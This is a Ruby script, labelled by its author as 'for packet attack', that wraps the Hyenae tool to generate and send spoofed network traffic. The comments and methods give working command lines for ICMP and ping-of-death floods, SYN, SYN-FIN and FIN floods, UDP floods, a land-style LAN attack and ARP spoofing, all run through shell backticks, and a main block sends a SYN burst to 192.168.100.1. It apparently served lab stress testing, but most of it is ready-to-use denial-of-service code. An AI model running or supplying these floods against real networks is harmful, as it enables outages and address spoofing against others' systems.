#encoding:utf-8
#HyenaeFE must be installed
#this is for packet attack
#author:wuhongliang
#date:2016-06-03
module HtmlTag

  class Packets
    attr_accessor :intf, :smac, :sip, :dmac, :dip

    def initialize(infid, smac, sip, dmac, dip)
      @intf=infid
      @smac=smac
      @sip =sip
      @dmac=dmac
      @dip =dip
    end

    #icmp-echo flood
    #rs=`hyenae -I 1 -A 4 -a icmp-echo  -s 00:11:22:33:44:55-192.168.100.10 -d 00:11:22:33:44:55-192.168.100.10 -t 64 -c 10000`
    #ping of death
    # hyenae -I 1 -A 4 -a icmp-echo  -s 00:11:22:33:44:55-192.168.100.10 -d 00:11:22:33:44:05-192.168.100.1 -t 128 -c 10 -p 1460
    def icmp_pkt(count=10000, payload=10, ttl=64)
      if payload >=10
        pkt = "icmp-echo -s #{@smac}-#{@sip} -d #{@dmac}-#{@dip} -t #{ttl} -c #{count} -p #{payload}"
      else
        pkt = "icmp-echo -s #{@smac}-#{@sip} -d #{@dmac}-#{@dip} -t #{ttl} -c #{count}"
      end
      p "Packets:#{pkt}"
      pkt
    end


    #SYN flood
    # hyenae -I 1 -A 4 -a tcp -s  00:11:22:33:44:55-192.168.100.100@2000 -d  00:11:22:33:44:55-192.168.100.1@1245 -f S -t 64 -k 0 -w 8192 -q 0 -Q 1 -c 100000
    #SYN FIN
    # hyenae -I 1 -A 4 -a tcp -s  00:11:22:33:44:55-192.168.100.100@2000 -d  00:11:22:33:44:55-192.168.100.1@5652 -f FS -t 64 -k 0 -w 8192 -q 0 -Q 1 -c 100000
    #FIN no ACK
    # hyenae -I 1 -A 4 -a tcp -s  00:11:22:33:44:55-192.168.100.100@2000 -d  00:11:22:33:44:55-192.168.100.1@5652 -f F -t 64 -k 11 -w 8192 -q 0 -Q 1 -c 100000
    # port random
    #hyenae -I 1 -A 4 -a tcp -s  00:11:22:33:44:55-192.168.100.100@%%%%% -d  00:11:22:33:44:55-192.168.100.1@%%%%% -f S -t 64 -k 11 -w 8192 -q 0 -Q 1 -c 100000
    #LAN attack
    # hyenae -I 1 -A 4 -a tcp -s 00:11:22:33:44:55-192.168.100.1@80 -d 00:11:22:33:44:55-192.168.100.1@80 -f S -t 64 -k 10 -w 8192 -q 1 -Q 1 -c 100000 -u 1000
    #flags,"S","F","R","P","A",
    def tcp_pkt(flags ="S", sport="%%%%%", dport="%%%%%", count=10000, payload=10, ttl=64, acknown=0, winsize=8192)
      flags=flags.upcase
      if payload >=10
        pkt= "tcp -s #{@smac}-#{@sip}@#{sport} -d #{@dmac}-#{@dip}@#{dport} -f #{flags} -t #{ttl} -k #{acknown} -w #{winsize} -q 1001 -Q 1 -c #{count} -p #{payload}"
      else
        pkt= "tcp -s #{@smac}-#{@sip}@#{sport} -d #{@dmac}-#{@dip}@#{dport} -f #{flags} -t #{ttl} -k #{acknown} -w #{winsize} -q 1001 -Q 1 -c #{count}"
      end
      p "Packets:#{pkt}"
      pkt
    end

    #UDP flood
    # hyenae -I 1 -A 4 -a udp -s 00:11:22:33:44:55-192.168.100.100@61020 -d 00:11:22:33:44:55-192.168.100.1@52301 -t 64 -c 100000
    #UDP random
    # hyenae -I 1 -A 4 -a udp -s 00:11:22:33:44:55-192.168.100.10@63210 -d 00:11:22:33:44:55-192.168.100.10@51000 -t 64 -c 100000
    def udp_pkt(sport="%%%%%", dport="%%%%%", count=10000, payload=10)
      if payload >=10
        pkt= "udp -s #{@smac}-#{@sip}@#{sport} -d #{@dmac}-#{@dip}@#{dport}  -c #{count} -p #{payload}"
      else
        pkt= "udp -s #{@smac}-#{@sip}@#{sport} -d #{@dmac}-#{@dip}@#{dport}  -c #{count}"
      end
      p pkt
      pkt
    end

    #ARP arp-reply
    #hyenae -I 1 -A 4 -a arp-request -s 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -S 00:11:22:33:44:55-192.168.100.10 -D 00:00:00:00:00:00-192.168.100.1 -c 1000
    #ARP arp-reply
    # hyenae -I 1 -A 4 -a arp-reply -s 00:00:00:00:00:01 -d 00:00:00:00:00:02 -S  00:00:00:00:00:01-192.168.100.10  -D 00:00:00:00:00:02-192.168.100.11  -c 100
    def arp_pkt(type, count=10000)
      if type=="arp-request"
        pkt= "#{type} -s #{@smac} -d FF:FF:FF:FF:FF:FF -S #{@smac}-#{@sip} -D 00:00:00:00:00:00-#{@dip} -c #{count}"
      elsif type=="arp-reply"
        pkt= "#{type} -s #{@smac} -d #{dmac} -S #{@smac}-#{@sip} -D #{@dmac}-#{@dip} -c #{count}"
      else
        fail "arp type error:#{type}"
      end
      p "Packets:#{pkt}"
      pkt
    end

    def send_pkt(pkt)
      hyenae_cmd = "hyenae -I #{@intf} -A 4 -a #{pkt}"
      p hyenae_cmd
      result={}
      begin
        rs = `#{hyenae_cmd}`
        print rs
        # Finished: 10000 packets sent (420000 bytes) in 7.722 seconds
        /Finished:\s+(?<pktnum>\d+)\s+packets.+\((?<pktsize>\d+)\s+bytes.+in\s+(?<time>\d+\.\d+)\s+seconds/im=~rs
        result={pktnum: pktnum, pktsize: pktsize, elapse: time}
      rescue => ex
        print ex.message.to_s
        false
      end
    end

    def send_icmp(count=10000, payload=10, ttl=64)
      pkt = icmp_pkt(count, payload, ttl)
      send_pkt(pkt)
    end

    def send_tcp(flags ="S", sport="%%%%%", dport="%%%%%", count=10000, payload=1, ttl=64, acknown=0, winsize=8192)
      pkt = tcp_pkt(flags, sport, dport, count, payload, ttl, acknown, winsize)
      send_pkt(pkt)
    end

    def send_udp(sport="%%%%%", dport="%%%%%", count=10000, payload=10)
      pkt = udp_pkt(sport, dport, count, payload)
      send_pkt(pkt)
    end

    def send_arp(type, count=10000)
      pkt = arp_pkt(type, count)
      send_pkt(pkt)
    end

  end
end

if __FILE__==$0
  smac = "00-E0-4D-68-04-06".gsub!("-", ":")
  sip  = "192.168.100.10"

  dmac   = "02-11-22-37-12-22".gsub!("-", ":")
  dip    = "192.168.100.1"
  pkt_obj= HtmlTag::Packets.new(2, smac, sip, dmac, dip)
  #print pkt    = pkt_obj.send_icmp(100)
  flag   ="S"
  sport  ="%%%%"
  dport  ="2584"
  print pkt = pkt_obj.send_tcp(flag, sport, dport, 100)
  # print `hyenae -I 2 -A 4 -a icmp-echo  -s 00:E0:4D:68:04:06-192.168.100.10 -d 02:11:22:37:12:22-192.168.100.1 -t 64 -c 1000`
  # print `hyenae -I 2 -A 4 -a icmp-echo  -s 00:E0:4D:68:04:06-192.168.100.10 -d 02:11:22:37:12:22-192.168.100.1 -t 64 -c 1000`
end